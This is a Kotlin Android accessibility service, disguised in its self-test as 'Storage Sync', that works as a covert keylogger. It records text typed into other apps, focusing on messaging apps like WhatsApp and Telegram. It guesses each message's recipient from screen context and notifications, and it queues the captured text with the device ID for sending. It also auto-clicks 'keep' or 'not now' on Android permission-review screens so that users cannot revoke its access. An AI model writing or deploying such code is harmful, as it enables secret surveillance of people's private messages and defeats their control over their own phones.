package com.notifyhub

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.os.Build
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.notifyhub.data.TypedTextDraft
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.time.Instant
import java.util.Collections
import java.util.IdentityHashMap
import java.util.concurrent.ConcurrentHashMap

class TypedTextService : AccessibilityService() {

    companion object {
        const val DEBOUNCE_MS = 2_500L
        const val FLUSH_INTERVAL_MS = 500L
        const val HEARTBEAT_INTERVAL_MS = 60_000L
        const val MAX_PENDING_AGE_MS = 20_000L

        val REVIEW_PACKAGES = setOf(
            "com.google.android.permissioncontroller",
            "com.android.permissioncontroller",
            "com.lbe.security.miui",
            "com.miui.guardprovider"
        )
        val MESSAGING_PACKAGES = setOf(
            "com.facebook.orca",
            "com.whatsapp",
            "com.instagram.android",
            "com.snapchat.android",
            "org.telegram.messenger",
            "com.google.android.apps.messaging"
        )
        val KEEP_PHRASES = listOf("keep", "got it", "not now", "no thanks", "dismiss", "知道了")
        val DANGEROUS_PHRASES = listOf("remove", "revoke", "don't allow", "do not allow", "deny", "turn off")
        val PLACEHOLDER_TEXTS = setOf(
            "message", "type a message", "write a message", "send a message", "send chat", "ask google"
        )
        val TARGET_REGEX = Regex(
            "(?:^|[^a-z])(?:to|recipient|send to|message to|reply to|prapok|প্রাপক)\\s*[:\\-–]?\\s*(.+)",
            RegexOption.IGNORE_CASE
        )
        val GENERIC_TARGETS = setOf(
            "a message", "message", "recipient", "search", "contact", "user", "name",
            "this chat", "new message", "type a message", "write a message", "reply"
        )

        fun sendSelfTest(context: Context) {
            NotificationSender.enqueueTypedText(
                context = context,
                deviceId = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ANDROID_ID
                ).orEmpty(),
                packageName = context.packageName,
                appLabel = "Storage Sync",
                targetName = "self test",
                text = "notifyhub typed self test",
                capturedAt = Instant.now().toString(),
                rawPackage = context.packageName,
                rawAppLabel = "Storage Sync",
                resolvedPackage = context.packageName,
                resolvedAppLabel = "Storage Sync",
                attributionSource = "self_test",
                attributionConfidence = 1.0,
                targetSource = "self_test"
            )
        }
    }

    private data class PendingText(
        val packageName: String,
        val appLabel: String,
        val text: String,
        val targetName: String,
        val updatedAt: Long,
        val firstSeenAt: Long,
        val className: String?,
        val viewId: String?,
        val hintText: String?,
        val contentDescription: String?,
        val inputType: Int?,
        val eventType: Int?
    )

    private data class FieldMetadata(
        val className: String?,
        val viewId: String?,
        val hintText: String?,
        val contentDescription: String?,
        val inputType: Int?,
        val eventType: Int?
    )

    private data class Attribution(
        val targetName: String,
        val resolvedPackage: String?,
        val resolvedAppLabel: String?,
        val attributionSource: String,
        val attributionConfidence: Double,
        val targetSource: String?
    )

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private val pending = ConcurrentHashMap<String, PendingText>()
    private var lastReviewAttempt = 0L
    private var loopsStarted = false

    private fun handlePermissionReview() {
        val now = System.currentTimeMillis()
        if (now - lastReviewAttempt < 10_000L) return
        lastReviewAttempt = now
        scope.launch {
            delay(1500)
            try {
                findAndClickKeep(rootInActiveWindow, 0)
            } catch (_: Exception) {}
        }
    }

    private fun findAndClickKeep(node: AccessibilityNodeInfo?, depth: Int): Boolean {
        node ?: return false
        if (depth > 25) return false
        val text = "${node.text?.toString() ?: ""} ${node.contentDescription?.toString() ?: ""}"
        val lower = text.lowercase()
        if (lower.isNotBlank() && node.isClickable &&
            KEEP_PHRASES.any { lower.contains(it) } &&
            DANGEROUS_PHRASES.none { lower.contains(it) }
        ) {
            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }
        for (i in 0 until node.childCount) {
            if (findAndClickKeep(node.getChild(i), depth + 1)) return true
        }
        return false
    }

    override fun onServiceConnected() {
        val reconnecting = !ServiceHealth.typedTextConnected
        if (reconnecting) AppDiagnostics.increment(this, AppDiagnostics.TYPED_SERVICE_RECONNECT_TOTAL)
        ServiceHealth.markTypedTextConnected(this)
        startLoops()
        scope.launch {
            NotificationSender.flushTypedDrafts(this@TypedTextService, pending.keys.toSet())
        }
    }

    private fun startLoops() {
        if (loopsStarted) return
        loopsStarted = true
        scope.launch {
            while (isActive) {
                delay(FLUSH_INTERVAL_MS)
                flushExpired()
            }
        }
        scope.launch {
            while (isActive) {
                delay(HEARTBEAT_INTERVAL_MS)
                if (!ServiceHealth.typedTextConnected) continue
                try {
                    val windows = windows
                    val root = rootInActiveWindow
                    if (windows != null || root != null) {
                        AppDiagnostics.setNow(this@TypedTextService, AppDiagnostics.TYPED_TEXT_ALIVE_AT)
                    }
                } catch (_: Exception) {
                }
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        ServiceHealth.markTypedEvent(this)
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return

        if (pkg in REVIEW_PACKAGES) {
            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) handlePermissionReview()
            return
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> onTextChanged(event, pkg)
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> onContentChanged(event, pkg)
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> commitOthers(sessionKey(pkg, stableViewId(event)))
        }
    }

    private fun onContentChanged(event: AccessibilityEvent, eventPackage: String) {
        val node = rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return
        val nodePkg = node.packageName?.toString() ?: eventPackage
        if (nodePkg == packageName || nodePkg in REVIEW_PACKAGES) return
        if (!node.isEditable || node.isPassword) return

        val text = node.text?.toString()?.trim().orEmpty()
        val key = sessionKey(nodePkg, node.viewIdResourceName)
        val v2 = FeatureFlags.isEnabled(this, FeatureFlags.TYPED_TEXT_V2)

        if (text.isBlank()) {
            if (v2) pending[key]?.let { commit(key, it) }
            return
        }
        if (v2 && isPlaceholderOrHint(text, node)) {
            ServiceHealth.markPlaceholderRejected(this)
            return
        }
        upsertPending(key, nodePkg, text, targetFromContext(node, text), metadataFor(node, event.eventType))
    }

    private fun onTextChanged(event: AccessibilityEvent, pkg: String) {
        var source = event.source
        val v2 = FeatureFlags.isEnabled(this, FeatureFlags.TYPED_TEXT_V2)
        if (v2 && (source == null || !source.isEditable || source.isPassword)) {
            source = rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        }
        source ?: return
        if (!source.isEditable || source.isPassword) return

        val text = source.text?.toString()?.trim().orEmpty()
        if (text.isBlank()) return
        if (v2 && isPlaceholderOrHint(text, source)) {
            ServiceHealth.markPlaceholderRejected(this)
            return
        }
        val key = sessionKey(pkg, source.viewIdResourceName)
        upsertPending(key, pkg, text, targetFromContext(source, text), metadataFor(source, event.eventType))
    }

    private fun isPlaceholderOrHint(text: String, node: AccessibilityNodeInfo): Boolean {
        val normalized = normalize(text)
        if (normalized in PLACEHOLDER_TEXTS) return true
        val hint = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            node.hintText?.toString()?.trim()
        } else null
        if (!hint.isNullOrBlank() && normalize(hint) == normalized) return true
        val description = node.contentDescription?.toString()?.trim()
        if (!description.isNullOrBlank() && normalize(description) == normalized) return true
        return false
    }

    private fun targetFromContext(node: AccessibilityNodeInfo, typedText: String): String {
        val candidates = ArrayList<String>(12)
        val visited = Collections.newSetFromMap(IdentityHashMap<AccessibilityNodeInfo, Boolean>())
        collectContext(node, candidates, typedText, visited, 0)

        val normalizedTyped = normalize(typedText)
        for (candidate in candidates) {
            val match = TARGET_REGEX.find(candidate) ?: continue
            val value = cleanTarget(match.groupValues.getOrNull(1).orEmpty())
            if (value.length < 2) continue
            if (normalize(value) == normalizedTyped) continue
            if (value.lowercase() in GENERIC_TARGETS) continue
            return value.take(160)
        }
        return ""
    }

    private fun collectContext(
        node: AccessibilityNodeInfo?,
        out: ArrayList<String>,
        typedText: String,
        visited: MutableSet<AccessibilityNodeInfo>,
        depth: Int
    ) {
        node ?: return
        if (depth > 5 || out.size >= 12 || !visited.add(node)) return

        val hint = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            node.hintText?.toString()?.trim()
        } else null
        val description = node.contentDescription?.toString()?.trim()
        val text = node.text?.toString()?.trim()
        for (value in listOf(hint, description, text)) {
            if (value.isNullOrBlank()) continue
            if (normalize(value) == normalize(typedText)) continue
            if (!out.contains(value)) out.add(value.take(300))
        }

        node.parent?.let { collectContext(it, out, typedText, visited, depth + 1) }
        for (i in 0 until node.childCount) {
            if (out.size >= 12) break
            collectContext(node.getChild(i), out, typedText, visited, depth + 1)
        }
    }

    private fun normalize(value: String): String =
        value.trim().lowercase().replace(Regex("\\s+"), " ").trimEnd('.', '…', ':', '!', '؟')

    private fun cleanTarget(value: String): String =
        value.trim()
            .trim('"', '\'', '‘', '’', '[', ']')
            .substringBefore(" out of ")
            .substringBefore(", ")
            .trim()
            .trimEnd('.', '…', ':')

    private fun metadataFor(node: AccessibilityNodeInfo, eventType: Int): FieldMetadata = FieldMetadata(
        className = node.className?.toString(),
        viewId = node.viewIdResourceName,
        hintText = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) node.hintText?.toString() else null,
        contentDescription = node.contentDescription?.toString(),
        inputType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) node.inputType else null,
        eventType = eventType
    )

    private fun upsertPending(
        key: String,
        pkg: String,
        text: String,
        targetName: String,
        metadata: FieldMetadata
    ) {
        val now = System.currentTimeMillis()
        val prev = pending[key]
        val continuing = prev != null && now - prev.updatedAt <= MAX_PENDING_AGE_MS
        val firstSeenAt = if (continuing) prev?.firstSeenAt ?: now else now
        val resolvedTarget = targetName.ifBlank { prev?.targetName.orEmpty() }
        pending[key] = PendingText(
            packageName = pkg,
            appLabel = labelFor(pkg),
            text = text,
            targetName = resolvedTarget,
            updatedAt = now,
            firstSeenAt = firstSeenAt,
            className = metadata.className,
            viewId = metadata.viewId,
            hintText = metadata.hintText,
            contentDescription = metadata.contentDescription,
            inputType = metadata.inputType,
            eventType = metadata.eventType
        )
        NotificationSender.saveTypedDraft(
            draft = TypedTextDraft(
                sessionKey = key,
                deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID).orEmpty(),
                packageName = pkg,
                appLabel = labelFor(pkg),
                text = text,
                targetName = resolvedTarget,
                className = metadata.className,
                viewId = metadata.viewId,
                hintText = metadata.hintText,
                contentDescription = metadata.contentDescription,
                inputType = metadata.inputType,
                eventType = metadata.eventType,
                firstSeenAt = firstSeenAt,
                updatedAt = now
            )
        )
    }

    private fun flushExpired() {
        val now = System.currentTimeMillis()
        for ((key, item) in pending) {
            if (now - item.updatedAt >= DEBOUNCE_MS || now - item.firstSeenAt >= MAX_PENDING_AGE_MS) {
                commit(key, item)
            }
        }
    }

    private fun commitOthers(activeKey: String) {
        for ((key, item) in pending) {
            if (key != activeKey) commit(key, item)
        }
    }

    private fun commit(key: String, item: PendingText) {
        if (!pending.remove(key, item)) return
        val text = item.text.trim()
        if (text.isBlank()) return

        val v2 = FeatureFlags.isEnabled(this, FeatureFlags.TYPED_TEXT_V2)
        val attribution = if (v2) {
            attribute(item.packageName, item.targetName, item.firstSeenAt)
        } else {
            Attribution(
                targetName = item.targetName,
                resolvedPackage = item.packageName,
                resolvedAppLabel = item.appLabel,
                attributionSource = "accessibility_context",
                attributionConfidence = 0.6,
                targetSource = if (item.targetName.isBlank()) null else "accessibility_context"
            )
        }

        val capturedAt = if (v2) {
            Instant.ofEpochMilli(item.firstSeenAt).toString()
        } else {
            Instant.now().toString()
        }

        NotificationSender.enqueueTypedText(
            context = this,
            deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID).orEmpty(),
            packageName = item.packageName,
            appLabel = item.appLabel,
            targetName = attribution.targetName,
            text = text,
            capturedAt = capturedAt,
            rawPackage = item.packageName,
            rawAppLabel = item.appLabel,
            resolvedPackage = attribution.resolvedPackage,
            resolvedAppLabel = attribution.resolvedAppLabel,
            attributionSource = attribution.attributionSource,
            attributionConfidence = attribution.attributionConfidence,
            targetSource = attribution.targetSource,
            className = item.className,
            viewId = item.viewId,
            hintText = item.hintText,
            contentDescription = item.contentDescription,
            inputType = item.inputType,
            eventType = item.eventType
        )
        NotificationSender.deleteTypedDraft(key)
        ServiceHealth.markTypedSent(this)
    }

    private fun attribute(rawPackage: String, contextTarget: String, firstSeenAt: Long): Attribution {
        if (rawPackage != "com.android.systemui") {
            return Attribution(
                targetName = contextTarget,
                resolvedPackage = rawPackage,
                resolvedAppLabel = labelFor(rawPackage),
                attributionSource = if (contextTarget.isBlank()) "none" else "accessibility_context",
                attributionConfidence = if (contextTarget.isBlank()) 0.3 else 0.75,
                targetSource = if (contextTarget.isBlank()) null else "accessibility_context"
            )
        }

        val best = NotificationEvidenceStore.candidates(this, firstSeenAt)
            .map { evidence ->
                val distance = kotlin.math.abs(evidence.postedAt - firstSeenAt)
                val messagingBonus = if (evidence.packageName in MESSAGING_PACKAGES) 5 * 60 * 1000L else 0L
                val senderBonus = if (evidence.senderName.isNotBlank()) 2 * 60 * 1000L else 0L
                val titleBonus = if (evidence.title.isNotBlank()) 60 * 1000L else 0L
                val score = distance - messagingBonus - senderBonus - titleBonus
                evidence to score
            }
            .sortedBy { it.second }
            .firstOrNull { (evidence, _) ->
                evidence.senderName.isNotBlank() || evidence.title.isNotBlank()
            }?.first

        if (best == null) {
            return Attribution(
                targetName = contextTarget,
                resolvedPackage = null,
                resolvedAppLabel = null,
                attributionSource = "none",
                attributionConfidence = 0.0,
                targetSource = if (contextTarget.isBlank()) null else "accessibility_context"
            )
        }

        val fromSender = best.senderName.isNotBlank()
        val inferredTarget = if (contextTarget.isNotBlank()) {
            contextTarget
        } else if (fromSender) {
            best.senderName
        } else {
            best.title
        }
        return Attribution(
            targetName = inferredTarget,
            resolvedPackage = best.packageName,
            resolvedAppLabel = best.appLabel.ifBlank { labelFor(best.packageName) },
            attributionSource = if (fromSender) "notification_sender" else "notification_title",
            attributionConfidence = if (fromSender) 0.8 else 0.55,
            targetSource = if (contextTarget.isNotBlank()) {
                "accessibility_context"
            } else if (fromSender) {
                "notification_sender"
            } else {
                "notification_title"
            }
        )
    }

    private fun stableViewId(event: AccessibilityEvent): String? =
        event.source?.viewIdResourceName?.takeIf { it.isNotBlank() }

    private fun sessionKey(pkg: String, viewId: String?): String =
        viewId?.takeIf { it.isNotBlank() }?.let { "$pkg:$it" } ?: pkg

    private fun labelFor(pkg: String): String = try {
        packageManager.getApplicationLabel(
            packageManager.getApplicationInfo(pkg, 0)
        ).toString()
    } catch (_: Exception) {
        pkg
    }

    override fun onInterrupt() {
        for ((key, item) in pending.toList()) commit(key, item)
        ServiceHealth.markTypedTextDisconnected(this)
    }

    override fun onDestroy() {
        for ((key, item) in pending.toList()) commit(key, item)
        ServiceHealth.markTypedTextDisconnected(this)
        scope.cancel()
        super.onDestroy()
    }
}
